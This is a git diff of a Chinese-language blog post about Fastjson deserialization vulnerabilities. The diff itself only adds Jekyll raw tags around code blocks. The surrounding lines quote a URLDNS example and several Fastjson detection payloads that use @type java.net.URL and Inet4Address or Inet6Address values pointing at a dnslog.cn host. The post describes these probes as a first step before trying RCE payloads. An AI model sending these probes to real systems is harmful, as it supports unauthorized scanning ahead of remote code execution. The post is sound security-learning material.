@@ -19,6 +19,7 @@ ps：漏洞学习环境以代码均在上传[Github项目](https://github.com/Su
 
    下面是一段最简单`Fastjson的版本号反序列化--URLDNS`代码，观察发现可以提出一个问题`@type`作用？
 
+{% raw %}
 ```java
 import com.alibaba.fastjson.JSON;
 public class urldns {
@@ -30,6 +31,7 @@ public class urldns {
     }
 }
 ```
+{% endraw %}
 
 ---
 
@@ -213,6 +215,7 @@ JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
 
    实战挖掘fastjson漏洞的时候比较常用的方法，探测Fastjson是用dnslog方式，探测到了再用RCE Payload去一个一个打。但是本人在本地环境测试的时候发现了几个不同点，fastjson的版本不同，不同的payload成功概率是不同的。至于为什么是这样子，可以参考一下这篇[通过dnslog探测fastjson的几种方法](http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/)。
 
+{% raw %}
 ```java
 // 目前最新版1.2.72版本可以使用1.2.36 < fastjson <= 1.2.72
 String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +
@@ -221,6 +224,7 @@ String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +
 String payload1 = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"zf7tbu.dnslog.cn\"}";
 String payload2 = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"zf7tbu.dnslog.cn\"}";
 ```
+{% endraw %}
 
 ---
 
